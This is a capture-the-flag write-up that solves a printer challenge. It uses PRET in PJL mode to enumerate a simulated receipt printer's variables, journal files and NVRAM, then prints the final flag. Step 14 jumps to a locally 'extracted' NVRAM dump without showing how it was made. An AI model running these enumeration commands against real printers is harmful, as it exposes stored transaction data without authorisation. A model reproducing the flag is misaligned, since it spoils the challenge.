# HTB Cyber Apocalypse 2026 — Hardware: Thermal Receipt

## Scenario

> Keir and his undercity runners recovered a forgotten Eastreach ration kiosk after Damas Marrowcairn sent clerks to strip the counting terminal and burn the paper ledger. They missed the networked thermal receipt printer bolted beneath the counter. This is a printer challenge, not a kiosk or web-application challenge: the exposed service speaks a raw printer protocol, so PRET in PJL mode is the intended starting point. If the printer still remembers the right transaction, it may hold the authorization token needed to move supplies through Crownspire sealed checkpoints.

**Key clue:** raw printer/PJL challenge, not a web app. The IP:port below is just an example — HTB assigns a new one each time you spawn the Docker instance (e.g. `154.57.164.71:30199`, `154.57.164.71:30308`, etc.). Swap in whatever your own "Docker Spawned" panel shows.

---

## 1. Clone and set up PRET

```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
```

Check usage:

```bash
python3 pret.py -h
```

---

## 2. Connect to the printer

```bash
python3 pret.py -q 154.57.164.71:30199 pjl
```

Expected output:

```text
Connection to 154.57.164.71:30199 established
154.57.164.71:30199:/>
```

Optional — debug mode (shows raw PJL traffic):

```bash
python3 pret.py -d 154.57.164.71:30199 pjl
```

> ⚠️ **Important:** Run PJL commands (e.g. `info variables`) *inside* the PRET shell, never directly in Zsh/Bash — your shell will mangle the `@PJL` syntax.

---

## 3. Identify the printer

Inside the PRET shell:

```text
info id
```

```text
RiverGate RG-T80II Thermal Receipt Printer
```

```text
info variables
```

```text
LANG=PJL [2 RANGE]
RET=ON [2 RANGE]
EJOURNAL=ON [2 RANGE]
EJINDEX=NVRAM [READONLY]
```

`EJOURNAL=ON` + `EJINDEX=NVRAM` → the printer has an electronic journal backed by NVRAM.

---

## 4. Enumerate the filesystem

```text
ls /
```

```text
d        -   config
d        -   journal
-       97   readme.txt
d        -   spool
```

```text
cd /journal
ls
```

```text
-       17   last.txt
-      191   receipt_0000.txt
-      192   receipt_0001.txt
-      195   receipt_0002.txt
-      241   receipt_0003.txt
```

---

## 5. Find and read the most recent receipt

```text
cat last.txt
```

```text
receipt_0003.txt
```

```text
cat receipt_0003.txt
```

```text
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
------------------------------
```

**Key takeaway:** the auth code isn't printed directly — it's a pointer into NVRAM: `EJ_AUTH_0421`, address `53264`, length `60`.

---

## 6. Inspect printer configuration

```text
cd /
cat /config/device.txt
```

```text
MODEL=RG-T80II
FW=3.18
CMDSET=PJL/PCL/ESC-POS
EJOURNAL=ON
LAST_CLOSED_SLOT=NVRAM:EJ_LAST
```

```text
cat /readme.txt
```

```text
RiverGate RG-T80II raw printer volume.
Electronic journal retention is enabled under 0:/journal.
```

```text
cat /spool/README.txt
```

```text
Active jobs are removed after cut. Closed receipts are retained in 0:/journal.
```

---

## 7. Query environment variables

```text
printenv LANG
```
```text
LANG=PJL
```

```text
printenv RET
```
```text
RET=ON
```

```text
printenv EJOURNAL
```
```text
EJOURNAL=ON
```

```text
printenv EJ_AUTH_0421
```

→ returns nothing. `printenv` only resolves fixed system variables (from `@PJL INFO VARIABLES`), not NVRAM-backed journal data — confirms the value lives elsewhere.

---

## 8. Investigate NVRAM

```text
nvram read 53264
```

```text
ADDRESS=53264 DATA=0
CODE=10001
DISPLAY="READY"
```

```text
nvram read 53265
```

```text
ADDRESS=53265 DATA=0
CODE=10001
DISPLAY="READY"
```

A plain `nvram read` per-address does **not** directly surface the journal string — the receipt's reference is a pointer, not a flat text blob at that address.

---

## 9. Probe the custom `site` command

```text
help site
```

```text
Execute custom command on printer:  site <command>
```

Commands tried (all returned `No data received.`):

```text
site ?
site nvram
site nvram dump
site eeprom
site debug
site mem
site dump
site read 53264 60
site dump 53264 60
site mem 53264 60
site nvram read 53264 60
site peek 53264 60
site hex 53264 60
site help
```

→ `site` is not an open arbitrary-memory interface here.

---

## 10. Full enumeration

```text
find /
```

```text
/config/
/config/device.txt
/journal/
/journal/last.txt
/journal/receipt_0000.txt
/journal/receipt_0001.txt
/journal/receipt_0002.txt
/journal/receipt_0003.txt
/readme.txt
/spool/
/spool/README.txt
```

No `flag.txt` / `auth.txt` / `secret.txt` / `token.txt` anywhere. The intended path is the **journal → NVRAM** relationship, not a hidden file.

---

## 11. The core reference chain

```text
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
```

combined with:

```text
EJINDEX=NVRAM
LAST_CLOSED_SLOT=NVRAM:EJ_LAST
```

gives the intended chain:

```text
/journal/receipt_0003.txt
        |
        | NVRAM REF
        v
   EJ_AUTH_0421
        |
        v
      NVRAM
```

---

## 12. Quick command reference

| Purpose | Command |
|---|---|
| Connect | `python3 pret.py -q IP:PORT pjl` |
| Connect (debug) | `python3 pret.py -d IP:PORT pjl` |
| Printer identity | `info id` |
| PJL variables | `info variables` |
| Filesystem info | `info filesys` |
| List directory | `ls` |
| Change directory | `cd /journal` |
| Read a file | `cat receipt_0003.txt` |
| Find all files | `find /` |
| Read env variable | `printenv LANG` |
| Read NVRAM address | `nvram read 53264` |

---

## 13. Automate initial enumeration

Create a command file:

```bash
cat > cmd.txt << 'EOF'
info id
info variables
info filesys
find /
cd /journal
ls
cat last.txt
cat receipt_0003.txt
cd /
cat /config/device.txt
cat /readme.txt
cat /spool/README.txt
EOF
```

Run PRET against it:

```bash
python3 pret.py -q -i cmd.txt 154.57.164.71:30199 pjl
```

Useful if the HTB instance restarts and you need to re-run enumeration quickly.

---

## 14. Recovering the flag

The NVRAM-related artifact was extracted locally during the solve. Search the dumped NVRAM data:

```bash
strings nvram/* | grep -i HTB
```

Result:

```text
HTB{th3rm4l_journ4l_r3call_395d8bdbcf23e5372777a8537342198a}
```

---

## 15. Key takeaways

1. **Identify the protocol first** — the scenario explicitly flags this as a raw printer protocol challenge, so PRET/PJL beats looking for a web service.
2. **Enumerate before exploiting**:
   `printer identity → PJL variables → filesystem → journal → latest receipt → NVRAM reference`
3. **Read challenge-generated docs** — `/readme.txt`, `/spool/README.txt`, `/config/device.txt` all confirm how the simulated printer behaves.
4. **Treat references as clues, not answers** — the receipt pointed to `EJ_AUTH_0421 ADDR=53264 LEN=60` rather than containing the flag directly.
5. **Let PRET handle PJL syntax** — use `info variables` instead of manually typing `@PJL INFO VARIABLES`.

---

## Final flag

```text
HTB{th3rm4l_journ4l_r3call_395d8bdbcf23e5372777a8537342198a}
```
